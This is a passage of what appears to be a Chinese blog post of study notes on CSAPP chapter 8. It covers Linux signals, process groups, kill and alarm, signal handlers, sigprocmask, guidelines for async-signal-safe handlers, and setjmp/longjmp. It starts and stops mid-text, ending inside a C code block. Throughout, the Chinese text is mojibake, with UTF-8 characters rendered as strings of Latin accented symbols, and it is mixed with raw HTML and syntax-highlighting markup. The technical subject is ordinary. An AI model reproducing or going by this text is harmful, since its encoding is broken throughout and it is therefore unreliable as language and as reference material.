è£…è½½çˆ¶è¿›ç¨‹è¯»å…¥çš„ä¸€ä¸ªå‘½ä»¤ï¼Œçˆ¶è¿›ç¨‹æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯ç­‰å¾…æ‰§è¡Œå®Œæ¯•ï¼ˆä¸€èˆ¬shelléƒ½æ”¯æŒçš„ï¼‰ï¼Œè¿™ä¸ªå¯ä»¥ç›´æ¥ä½¿ç”¨ wait å®ç°ï¼Œæˆ–è€…æ˜¯åŠ ä¸€ä¸ª <code>&amp;</code> æŒ‚åœ¨åå°è¿è¡Œï¼Œæˆ‘ä»¬åªè¦æ ¹æ®åŠ æ²¡åŠ  <code>&amp;</code> åˆ¤æ–­ wait çš„å‚æ•°å³å¯ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬è¿˜æœ‰é€‰æ‹©å¤„ç†ä¿¡å·ï¼Œå› ä¸ºæ”¶åˆ°äº† <code>Ctrl+C</code> çš„ç»ˆæ­¢ä¿¡å·ä¹‹åï¼Œæˆ‘ä»¬ä¸åº”å½“ç»ˆæ­¢çˆ¶è¿›ç¨‹ï¼Œè€Œåº”è¯¥æŠŠå®ƒè½¬å‘ç»™å­è¿›ç¨‹ï¼Œè®©å­è¿›ç¨‹å»å¤„ç†ã€‚</p><h1 id="ä¿¡å·"><a href="#ä¿¡å·" class="headerlink" title="ä¿¡å·"></a>ä¿¡å·</h1><p> Linux ä¿¡å·å…è®¸è¿›ç¨‹å’Œå†…æ ¸ä¸­æ–­å…¶ä»–è¿›ç¨‹ã€‚ä¸€ä¸ªä¿¡å·å°±æ˜¯ä¸€æ¡å°æ¶ˆæ¯ï¼Œå®ƒé€šçŸ¥è¿›ç¨‹ç³»ç»Ÿä¸­å‘ç”Ÿäº†ä¸€ä¸ªæŸç§ç±»å‹çš„äº‹ä»¶ã€‚</p><p>æ¯ç§ä¿¡å·ç±»å‹éƒ½å¯¹åº”äºæŸç§ç³»ç»Ÿäº‹ä»¶ã€‚ä½å±‚çš„ç¡¬ä»¶å¼‚å¸¸æ˜¯ç”±å†…æ ¸å¼‚å¸¸å¤„ç†ç¨‹åºå¤„ç†çš„ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™äº›ç¡¬ä»¶å¼‚å¸¸å¯¹ç”¨æˆ·è¿›ç¨‹è€Œè¨€æ˜¯ä¸å¯è§çš„ã€‚ä¿¡å·æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œé€šçŸ¥ç”¨æˆ·è¿›ç¨‹å‘ç”Ÿäº†è¿™äº›å¼‚å¸¸ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-linux%E4%BF%A1%E5%8F%B7.png"></p><h3 id="ä¿¡å·æœ¯è¯­"><a href="#ä¿¡å·æœ¯è¯­" class="headerlink" title="ä¿¡å·æœ¯è¯­"></a>ä¿¡å·æœ¯è¯­</h3><p>ä¼ é€ä¸€ä¸ªä¿¡å·åˆ°ç›®çš„è¿›ç¨‹æ˜¯ç”±ä¸¤ä¸ªä¸åŒçš„æ­¥éª¤ç»„æˆçš„ï¼šå‘é€ä¿¡å·å’Œæ¥æ”¶ä¿¡å·ã€‚</p><p>ä¸€ä¸ªå‘å‡ºè€Œæ²¡æœ‰è¢«æ¥æ”¶çš„ä¿¡å·å«åš<strong>å¾…å¤„ç†ä¿¡å·</strong>ã€‚</p><p><strong>åœ¨ä»»ä½•æ—¶åˆ»ï¼Œä¸€ç§ç±»å‹è‡³å¤šåªä¼šæœ‰ä¸€ä¸ªå¾…å¤„ç†ä¿¡å·ã€‚</strong></p><p>å¦‚æœä¸€ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªç±»å‹ä¸ºçš„å¾…å¤„ç†ä¿¡å·ï¼Œé‚£ä¹ˆä»»ä½•æ¥ä¸‹æ¥å‘é€åˆ°è¿™ä¸ªè¿›ç¨‹çš„ä¿¡å·éƒ½ä¸ä¼šæ’é˜Ÿç­‰å¾…ï¼Œå®ƒä»¬åªæ˜¯è¢«ç®€å•åœ°ä¸¢å¼ƒã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰é€‰æ‹©æ€§åœ°é˜»å¡æ¥æ”¶æŸç§ä¿¡å·ã€‚å½“ä¸€ç§ä¿¡å·è¢«é˜»å¡æ—¶ï¼Œå®ƒä»å¯ä»¥è¢«å‘é€ï¼Œä½†æ˜¯äº§ç”Ÿçš„å¾…å¤„ç†ä¿¡å·ä¸ä¼šè¢«æ¥æ”¶ï¼Œç›´åˆ°è¿›ç¨‹å–æ¶ˆå¯¹è¿™ç§ä¿¡å·çš„é˜»å¡ã€‚</p><p><strong>ä¸€ä¸ªå¾…å¤„ç†ä¿¡å·æœ€å¤šåªèƒ½è¢«æ¥æ”¶ä¸€æ¬¡ã€‚</strong></p><h3 id="å‘é€ä¿¡å·"><a href="#å‘é€ä¿¡å·" class="headerlink" title="å‘é€ä¿¡å·"></a>å‘é€ä¿¡å·</h3><p>å‘é€ä¿¡å·å¯ä»¥æœ‰å¦‚ä¸‹ä¸¤ç§åŸå› ï¼š</p><ul><li>å†…æ ¸æ£€æµ‹åˆ°ä¸€ä¸ªç³»ç»Ÿäº‹ä»¶ï¼Œæ¯”å¦‚é›¶é™¤é”™è¯¯æˆ–è€…å­è¿›ç¨‹ä¸­ç»ˆæ­¢</li><li>ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨äº† kill å‡½æ•°ï¼Œæ˜¾ç¤ºè¦æ±‚å†…æ ¸å‘é€ä¿¡å·ç»™ç›®çš„è¿›ç¨‹</li></ul><h4 id="è¿›ç¨‹ç»„"><a href="#è¿›ç¨‹ç»„" class="headerlink" title="è¿›ç¨‹ç»„"></a>è¿›ç¨‹ç»„</h4><p>æ‰€æœ‰å‘é€ä¿¡å·çš„æœºåˆ¶éƒ½æ˜¯åŸºäºè¿›ç¨‹ç»„ï¼ˆprocessgroupï¼‰è¿™ä¸ªæ¦‚å¿µçš„ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½åªå±äºä¸€ä¸ªè¿›ç¨‹ç»„ï¼Œè¿›ç¨‹ç»„æ˜¯ç”±ä¸€ä¸ªæ­£æ•´æ•°è¿›ç¨‹ç»„ IDæ¥æ ‡è¯†çš„ã€‚</p><p><code>setpgid(pid_t pid,pid_t pgid)</code> å¯ä»¥ä¸ºæŒ‡å®šè¿›ç¨‹è®¾ç½®è¿›ç¨‹ç»„ <code>id</code>ï¼Œå¦‚æœ <code>pid</code> å‚æ•°ä¸º <code>0</code>ï¼Œé‚£ä¹ˆè¡¨ç¤ºå¯¹è‡ªèº«è®¾ç½®ï¼Œå¦‚æœ <code>pgid</code> ä¸º <code>0</code>ï¼Œè¡¨ç¤ºåˆ›å»ºä¸€ä¸ª <code>gid</code> ç­‰äº <code>pid</code> çš„ä¸€ä¸ªç»„å¹¶åŠ å…¥å…¶ä¸­ã€‚</p><h4 id="ä½¿ç”¨-x2F-bin-x2F-kill-å‘é€ä¿¡å·"><a href="#ä½¿ç”¨-x2F-bin-x2F-kill-å‘é€ä¿¡å·" class="headerlink" title="ä½¿ç”¨ &#x2F;bin&#x2F;kill å‘é€ä¿¡å·"></a>ä½¿ç”¨ &#x2F;bin&#x2F;kill å‘é€ä¿¡å·</h4><p><code>/bin/kill -9 12345</code> å¯ä»¥ç»™ <code>pid</code> ä¸º <code>12345</code> çš„è¿›ç¨‹å‘é€<strong>ä¿¡å·9ï¼ˆSIGKILLï¼‰</strong>ã€‚å¦‚æœ pid ä¸ºè´Ÿï¼Œåˆ™è¡¨ç¤ºç»™å¯¹åº”çš„ç»„ä¸­æ‰€æœ‰çš„è¿›ç¨‹å‘é€è¿™ä¸ªä¿¡å·ã€‚</p><h4 id="ä»é”®ç›˜å‘é€ä¿¡å·"><a href="#ä»é”®ç›˜å‘é€ä¿¡å·" class="headerlink" title="ä»é”®ç›˜å‘é€ä¿¡å·"></a>ä»é”®ç›˜å‘é€ä¿¡å·</h4><p>shell ä½¿ç”¨ä½œä¸šï¼ˆjobï¼‰æ¥è¡¨ç¤ºä¸€æ¡å‘½ä»¤æ‰€åˆ›å»ºçš„è¿›ç¨‹ã€‚åœ¨ä»»ä½•æ—¶åˆ»ï¼Œæœ€å¤šæœ‰ä¸€ä¸ªå‰å°ä½œä¸šå’Œ 0 ä¸ªæˆ–å¤šä¸ªåå°ä½œä¸šã€‚</p><p>åœ¨é”®ç›˜ä¸­è¾“å…¥ <code>Ctrl+C</code> ä¼šå¯¼è‡´å†…æ ¸å‘é€ä¸€ä¸ª <code>SIGINT</code> ä¿¡å·åˆ°å‰å°è¿›ç¨‹ç»„ä¸­çš„æ¯ä¸€ä¸ªè¿›ç¨‹ï¼Œæœ€ç»ˆç»“æœå°±æ˜¯ç»ˆæ­¢å‰å°ä½œä¸šã€‚ç±»ä¼¼çš„ï¼Œä½¿ç”¨ <code>Ctrl+Z</code> ä¼šå‘é€ä¸€ä¸ª <code>SIGSTOP</code> ä¿¡å·ç»™æ‰€æœ‰å‰å°ä½œä¸šï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œç»“æœæ˜¯æŒ‚èµ·å‰å°ä½œä¸šã€‚</p><h4 id="killå‡½æ•°å‘é€ä¿¡å·"><a href="#killå‡½æ•°å‘é€ä¿¡å·" class="headerlink" title="killå‡½æ•°å‘é€ä¿¡å·"></a>killå‡½æ•°å‘é€ä¿¡å·</h4><p>è¿›ç¨‹é€šè¿‡è°ƒç”¨ <code>kill(pid_t pid,int sig)</code> å‘é€ä¸€ä¸ª <code>sig</code> ä¿¡å·ç»™è¿›ç¨‹ id ä¸º pid çš„è¿›ç¨‹ã€‚</p><ul><li>pid &#x3D; 0ï¼šç»™è‡ªå·±æ‰€åœ¨çš„è¿›ç¨‹ç»„ä¸­çš„æ¯ä¸€ä¸ªè¿›ç¨‹å‘é€ä¿¡å·</li><li>pid &lt; 0ï¼šç»™ç»„ id ä¸º <code>|pid|</code> çš„æ‰€æœ‰è¿›ç¨‹å‘é€ä¿¡å·</li></ul><h4 id="ç”¨-alarm-å‡½æ•°å‘é€ä¿¡å·"><a href="#ç”¨-alarm-å‡½æ•°å‘é€ä¿¡å·" class="headerlink" title="ç”¨ alarm å‡½æ•°å‘é€ä¿¡å·"></a>ç”¨ alarm å‡½æ•°å‘é€ä¿¡å·</h4><p><code>unsigned alarm(unsigned secs)</code> å‡½æ•°å¯ä»¥ç»™è‡ªèº«å‘é€ <code>SIGALRM</code> ä¿¡å·ï¼Œå†…æ ¸ä¼šåˆ›å»ºä¸€ä¸ªå®šæ—¶å™¨ï¼Œåˆ°æŒ‡å®š <code>secs</code> ç§’æ•°ä¹‹åï¼Œå†…æ ¸ä¼šå‘é€ä¸€ä¸ª <code>SIGALRM</code> ä¿¡å·ï¼Œ<strong>è¿”å›å€¼ä¸ºä¸Šä¸€æ¬¡é—¹é’Ÿæ‰€å‰©ä½™çš„ç§’æ•°</strong>ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œåˆ™è¿”å› 0ã€‚</p><h3 id="æ¥æ”¶ä¿¡å·"><a href="#æ¥æ”¶ä¿¡å·" class="headerlink" title="æ¥æ”¶ä¿¡å·"></a>æ¥æ”¶ä¿¡å·</h3><p>å½“å†…æ ¸æŠŠè¿›ç¨‹ p ä»å†…æ ¸æ¨¡å¼åˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼æ—¶ï¼ˆä¾‹å¦‚ä»ç³»ç»Ÿè°ƒç”¨è¿”å›ï¼Œæˆ–æ˜¯å®Œæˆäº†ä¸€æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼‰ï¼Œå®ƒä¼šæ£€æŸ¥è¿›ç¨‹çš„æœªè¢«é˜»å¡çš„å¾…å¤„ç†ä¿¡å·çš„é›†åˆï¼ˆpending&amp;~blockedï¼‰ã€‚</p><p>å¦‚æœé›†åˆæ˜¯éç©ºçš„ï¼Œé‚£ä¹ˆå†…æ ¸é€‰æ‹©é›†åˆä¸­çš„æŸä¸ªä¿¡å· k (é€šå¸¸æ˜¯æœ€å°çš„ï¼‰å¹¶ä¸”å¼ºåˆ¶è¿›ç¨‹æ¥æ”¶ä¿¡å· k ã€‚æ”¶åˆ°è¿™ä¸ªä¿¡å·ä¼šè§¦å‘è¿›ç¨‹ p é‡‡å–æŸç§è¡Œä¸ºã€‚ä¸€æ—¦è¿›ç¨‹å®Œæˆäº†è¿™ä¸ªè¡Œä¸ºï¼Œé‚£ä¹ˆæ§åˆ¶å°±ä¼ é€’å› p çš„é€»è¾‘æ§åˆ¶æµä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>æ¯ä¸ªä¿¡å·ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„è¡Œä¸ºï¼š</p><ul><li>ç»ˆæ­¢è¿›ç¨‹</li><li>ç»ˆæ­¢è¿›ç¨‹å¹¶è½¬å‚¨å†…å­˜</li><li>æŒ‚èµ·è¿›ç¨‹</li><li>å¿½ç•¥ä¿¡å·</li></ul><p>ä½¿ç”¨ <code>signal(int signum,sighandler_t handler)</code> å‡½æ•°å¯ä»¥ä¿®æ”¹ signum ä¿¡å·çš„è¡Œä¸ºï¼Œä¸åŒçš„ handler å¯¹åº”ä¸åŒçš„ç»“æœï¼š</p><ul><li>SIG_IGN ï¼šè¡¨ç¤ºå¿½ç•¥è¯¥ä¿¡å·</li><li>SIG_DFL ï¼šè¡¨ç¤ºæ¢å¤è¯¥ä¿¡å·çš„é»˜è®¤å¤„ç†</li></ul><blockquote><p>ä¸¤ç§ä¿¡å·ä¸èƒ½ä¿®æ”¹é»˜è®¤è¡Œä¸ºï¼Œä¹Ÿä¸èƒ½å¿½ç•¥ï¼š <code>SIGKILL</code> å’Œ <code>SIGSTOP</code></p></blockquote><p>è¿™ä¸ªå‡½æ•°è¢«ç§°ä¸º<strong>ä¿¡å·å¤„ç†ç¨‹åº</strong>ï¼Œåªè¦è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªç±»å‹ä¸º signum çš„ä¿¡å·ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªç¨‹åºã€‚é€šè¿‡æŠŠå¤„ç†ç¨‹åºçš„åœ°å€ä¼ é€’åˆ° signal å‡½æ•°ä»è€Œæ”¹å˜é»˜è®¤è¡Œä¸ºï¼Œè¿™å«åš<strong>è®¾ç½®ä¿¡å·å¤„ç†ç¨‹åº(installing the handler)<strong>ã€‚è°ƒç”¨ä¿¡å·å¤„ç†ç¨‹åºè¢«ç§°ä¸º</strong>æ•è·ä¿¡å·</strong>ã€‚æ‰§è¡Œä¿¡å·å¤„ç†ç¨‹åºè¢«ç§°ä¸º<strong>å¤„ç†ä¿¡å·</strong>ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F.png"></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨ä¿¡å·å¤„ç†ç¨‹åºæ‰§è¡Œ <code>return</code> æ—¶ï¼Œä¼šæŠŠæ§åˆ¶æµäº¤è¿˜ç»™è¢«ä¹‹å‰è¢«ä¸­æ–­é‚£æ¡æŒ‡ä»¤çš„åé¢ä¸€æ¡æŒ‡ä»¤ï¼Œä¾‹å¤–çš„æƒ…å†µå°±æ˜¯æŸäº›ç³»ç»Ÿåœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ”¶åˆ°ä¿¡å·ï¼Œç³»ç»Ÿè°ƒç”¨ä¼šç›´æ¥è¿”å›ä¸€ä¸ªé”™è¯¯ã€‚</p><p>ä¸€ä¸ªä¿¡å·å¤„ç†ç¨‹åºå¯èƒ½ä¼šè¢«å¦ä¸€ä¸ªä¿¡å·å¤„ç†ç¨‹åºæ‰“æ–­ï¼Œä½†æ˜¯ä¸ä¼šè¢«è‡ªå·±æ‰“æ–­ã€‚</p><h3 id="é˜»å¡å’Œè§£é™¤é˜»å¡ä¿¡å·"><a href="#é˜»å¡å’Œè§£é™¤é˜»å¡ä¿¡å·" class="headerlink" title="é˜»å¡å’Œè§£é™¤é˜»å¡ä¿¡å·"></a>é˜»å¡å’Œè§£é™¤é˜»å¡ä¿¡å·</h3><p>Linuxæä¾›é˜»å¡ä¿¡å·çš„éšå¼å’Œæ˜¾å¼çš„æœºåˆ¶ï¼š</p><ul><li>éšå¼é˜»å¡æœºåˆ¶ï¼šå†…æ ¸é»˜è®¤é˜»å¡ä»»ä½•å½“å‰å¤„ç†ç¨‹åºæ­£åœ¨å¤„ç†çš„ä¿¡å·ç±»å‹çš„å¾…å¤„ç†ä¿¡å·ã€‚</li><li>æ˜¾å¼é˜»å¡æœºåˆ¶ã€‚åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ <code>sigprocmask</code> å‡½æ•°å’Œå®ƒçš„è¾…åŠ©å‡½æ•°ï¼Œæ˜ç¡®åœ°é˜»å¡å’Œè§£é™¤é˜»å¡é€‰å®šçš„ä¿¡å·ã€‚</li></ul><p>ä½¿ç”¨å‡½æ•° <code>sigprocmask(int how,const sigset_t *set,sigset_t *oldset)</code> å¯ä»¥æ”¹å˜å½“å‰çš„ <code>block</code> é›†åˆå€¼ã€‚å…·ä½“çš„è¡Œä¸ºä¾èµ–äº howçš„å€¼ï¼š</p><ul><li>SIG_BLOCKï¼šæŠŠ set ä¸­çš„ä¿¡å·æ·»åŠ åˆ° blocked ä¸­ï¼ˆblocked&#x3D;blocked I setï¼‰ </li><li>SIG_UNBLOCKï¼šä»blocked ä¸­åˆ é™¤ set ä¸­çš„ä¿¡å·ï¼ˆblocked&#x3D;blocked &amp;~setï¼‰ </li><li>SIG_SETMASKï¼šblock&#x3D;set</li></ul><p>å¦‚æœ oldset éç©ºï¼Œé‚£ä¹ˆ blocked ä½å‘é‡ä¹‹å‰çš„å€¼ä¿å­˜åœ¨ oldset ä¸­ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„å‡½æ•°å¯¹ set ä¿¡å·è¿›è¡Œæ“ä½œï¼š</p><ul><li><code>int sigemptyset(sigset* set)</code> åˆå§‹åŒ– set ä¸ºç©ºé›†</li><li><code>int sigfillset(sigset* set)</code> å°† set å¡«æ»¡ä¿¡å·</li><li><code>int sigaddset(sigset* set, int signum)</code> å°† signum ä¿¡å·æ·»åŠ åˆ°é›†åˆä¸­</li><li><code>int sigdelset(sigset* set, int signum)</code> å°† signum ä¿¡å·ä»é›†åˆä¸­åˆ é™¤</li></ul><h1 id="ç¼–å†™ä¿¡å·å¤„ç†ç¨‹åº"><a href="#ç¼–å†™ä¿¡å·å¤„ç†ç¨‹åº" class="headerlink" title="ç¼–å†™ä¿¡å·å¤„ç†ç¨‹åº"></a>ç¼–å†™ä¿¡å·å¤„ç†ç¨‹åº</h1><h3 id="å®‰å…¨çš„ä¿¡å·å¤„ç†"><a href="#å®‰å…¨çš„ä¿¡å·å¤„ç†" class="headerlink" title="å®‰å…¨çš„ä¿¡å·å¤„ç†"></a>å®‰å…¨çš„ä¿¡å·å¤„ç†</h3><h4 id="G0-å¤„ç†ç¨‹åºè¦å°½å¯èƒ½ç®€å•"><a href="#G0-å¤„ç†ç¨‹åºè¦å°½å¯èƒ½ç®€å•" class="headerlink" title="G0 å¤„ç†ç¨‹åºè¦å°½å¯èƒ½ç®€å•"></a>G0 å¤„ç†ç¨‹åºè¦å°½å¯èƒ½ç®€å•</h4><p>é¿å…éº»çƒ¦çš„æœ€å¥½æ–¹æ³•æ˜¯ä¿æŒå¤„ç†ç¨‹åºå°½å¯èƒ½çš„å°å’Œç®€å•ã€‚æˆ‘ä»¬å°½é‡å°†å¤æ‚çš„é€»è¾‘æ”¾åœ¨ä¸»å‡½æ•°ä¸­å®ç°ï¼Œå°½é‡ç®€å•çš„è®¾ç½®å…¨å±€æ ‡å¿—ã€‚</p><h4 id="G1-åœ¨å¤„ç†ç†ç¨‹åºä¸­åªè°ƒç”¨å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°"><a href="#G1-åœ¨å¤„ç†ç†ç¨‹åºä¸­åªè°ƒç”¨å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°" class="headerlink" title="G1 åœ¨å¤„ç†ç†ç¨‹åºä¸­åªè°ƒç”¨å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°"></a>G1 åœ¨å¤„ç†ç†ç¨‹åºä¸­åªè°ƒç”¨å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°</h4><p>æ‰€è°“å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°èƒ½å¤Ÿè¢«ä¿¡å·å¤„ç†ç¨‹åºå®‰å…¨åœ°è°ƒç”¨ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ul><li>è¦ä¹ˆå®ƒæ˜¯å¯é‡å…¥çš„ï¼Œæ„å‘³ç€å®ƒåªä¼šè°ƒç”¨å±€éƒ¨å˜é‡è€Œä¸è®¿é—®ä»»ä½•å…¨å±€å˜é‡</li><li>å®ƒä¸èƒ½è¢«ä¿¡å·å¤„ç†ç¨‹åºä¸­æ–­ï¼Œæ„å‘³ç€è¿™ä¸ªå‡½æ•°è¦ä¹ˆä¸æ‰§è¡Œï¼Œè¦ä¹ˆå®Œå…¨æ‰§è¡Œã€‚</li></ul><blockquote><p>æ‰€æœ‰çš„ IO å‡½æ•°éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒä»¬å¯è¢«æ‰“æ–­ï¼Œä¸”åœ¨è°ƒç”¨ IO å‡½æ•°çš„æ—¶å€™éƒ½ä¼šè®¿é—®ä¸€ä¸ª <code>_IO_2_1_stdout</code> çš„å…¨å±€ç»“æ„ã€‚</p></blockquote><h4 id="G2-æ¢å¤å’Œä¿å­˜-errno"><a href="#G2-æ¢å¤å’Œä¿å­˜-errno" class="headerlink" title="G2 æ¢å¤å’Œä¿å­˜ errno"></a>G2 æ¢å¤å’Œä¿å­˜ errno</h4><p>è®¸å¤š Linux å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°éƒ½ä¼šåœ¨å‡ºé”™è¿”å›æ—¶è®¾ç½® errnoã€‚</p><p>ä½†æ˜¯å¤„ç†ç¨‹åºä¸­è°ƒç”¨è¿™æ ·çš„å‡½æ•°å¯èƒ½ä¼šå¹²æ‰°ä¸»ç¨‹åºä¸­çš„å…¶ä»–éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿›å…¥å¤„ç†ç¨‹åºæ—¶æŠŠ errno ä¿å­˜åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œåœ¨å¤„ç†ç¨‹åºè¿”å›å‰æ¢å¤å®ƒã€‚</p><h4 id="G3-é˜»å¡æ‰€æœ‰ä¿¡å·ï¼Œä¿æŠ¤å¯¹å…±äº«å…¨å±€æ•°æ®ç»“æ„çš„è®¿é—®"><a href="#G3-é˜»å¡æ‰€æœ‰ä¿¡å·ï¼Œä¿æŠ¤å¯¹å…±äº«å…¨å±€æ•°æ®ç»“æ„çš„è®¿é—®" class="headerlink" title="G3 é˜»å¡æ‰€æœ‰ä¿¡å·ï¼Œä¿æŠ¤å¯¹å…±äº«å…¨å±€æ•°æ®ç»“æ„çš„è®¿é—®"></a>G3 é˜»å¡æ‰€æœ‰ä¿¡å·ï¼Œä¿æŠ¤å¯¹å…±äº«å…¨å±€æ•°æ®ç»“æ„çš„è®¿é—®</h4><p>å¦‚æœå¤„ç†ç¨‹åºå’Œä¸»ç¨‹åºæˆ–å…¶ä»–å¤„ç†ç¨‹åºå…±äº«ä¸€ä¸ªå…¨å±€æ•°æ®ç»“æ„ï¼Œé‚£ä¹ˆåœ¨è®¿é—®ï¼ˆè¯»æˆ–è€…å†™ï¼‰è¯¥æ•°æ®ç»“æ„æ—¶ï¼Œå¤„ç†ç¨‹åºå’Œä¸»ç¨‹åºåº”è¯¥æš‚æ—¶é˜»å¡æ‰€æœ‰çš„ä¿¡å·ã€‚</p><h4 id="G4-ç”¨-volatile-å£°æ˜å…¨å±€å˜é‡"><a href="#G4-ç”¨-volatile-å£°æ˜å…¨å±€å˜é‡" class="headerlink" title="G4 ç”¨ volatile å£°æ˜å…¨å±€å˜é‡"></a>G4 ç”¨ volatile å£°æ˜å…¨å±€å˜é‡</h4><p>å¯ä»¥ç”¨ volatile ç±»å‹é™å®šç¬¦æ¥å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œè®©ç¼–è¯‘å™¨ä¸å¯¹å…¶ä¸­çš„ä»£ç åšå‡ºä¼˜åŒ–ï¼Œæ¯æ¬¡å¼•ç”¨éƒ½ä¼šä»å†…å­˜ä¸­è¯»å‡ºå€¼ã€‚ä¾‹å¦‚ <code>volatile int g;</code></p><h4 id="G5-ç”¨-sig-atomict-å£°æ˜æ ‡å¿—"><a href="#G5-ç”¨-sig-atomict-å£°æ˜æ ‡å¿—" class="headerlink" title="G5 ç”¨ sig atomict å£°æ˜æ ‡å¿—"></a>G5 ç”¨ sig atomict å£°æ˜æ ‡å¿—</h4><p>æ•´å‹æ•°æ®å‹ <code>sig atomic_t</code>ï¼Œå¯¹å®ƒçš„è¯»å’Œå†™ä¿è¯ä¼šæ˜¯åŸå­çš„ï¼ˆä¸å¯ä¸­æ–­çš„ï¼‰ã€‚</p><h3 id="æ­£ç¡®çš„ä¿¡å·å¤„ç†"><a href="#æ­£ç¡®çš„ä¿¡å·å¤„ç†" class="headerlink" title="æ­£ç¡®çš„ä¿¡å·å¤„ç†"></a>æ­£ç¡®çš„ä¿¡å·å¤„ç†</h3><p>ä»è¿™é‡Œå¼€å§‹åˆ°è¿™ä¸€èŠ‚ç»“æŸï¼Œè¿™éƒ¨åˆ†çš„ä¸œè¥¿å¤šå¤šå°‘å°‘éƒ½è®²è¿‡äº†ï¼Œé‚ä¸è®°ğŸ¤ª</p><h1 id="éæœ¬åœ°è·³è½¬"><a href="#éæœ¬åœ°è·³è½¬" class="headerlink" title="éæœ¬åœ°è·³è½¬"></a>éæœ¬åœ°è·³è½¬</h1><p>Cè¯­è¨€æä¾›äº†ä¸€ç§ç”¨æˆ·çº§å¼‚å¸¸æ§åˆ¶æµå½¢å¼ï¼Œç§°ä¸ºéæœ¬åœ°è·³è½¬ï¼ˆnonlocaljumpï¼‰ï¼Œå®ƒå°†æ§åˆ¶ç›´æ¥ä»ä¸€ä¸ªå‡½æ•°è½¬ç§»åˆ°å¦ä¸€ä¸ªå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œè€Œä¸éœ€è¦ç»è¿‡æ­£å¸¸çš„è°ƒç”¨-è¿”å›åºåˆ—ã€‚</p><p>éæœ¬åœ°è·³è½¬æ˜¯é€šè¿‡ setjmp å’Œ longjmp å‡½æ•°æ¥æä¾›çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setjmp</span><span class="hljs-params">(jmp_buf env)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-type">int</span> savesigs)</span>;<br></code></pre></td></tr></table></figure><p>setjmp å‡½æ•°åœ¨ env ç¼“å†²åŒºä¸­ä¿å­˜å½“å‰è°ƒç”¨ç¯å¢ƒï¼Œä»¥ä¾›åé¢çš„ longjmp ä½¿ç”¨ï¼Œå¹¶è¿”å› 0ã€‚</p><p>longjmp å‡½æ•°ä» env ç¼“å†²åŒºç§å›å¤è°ƒç”¨ç¯å¢ƒï¼Œç„¶åè§¦å‘ä¸€ä¸ªä»æœ€è¿‘ä¸€æ¬¡åˆå§‹åŒ– env çš„ setjmp çš„è°ƒç”¨è¿”å›ï¼Œè¿”å›å€¼éé›¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 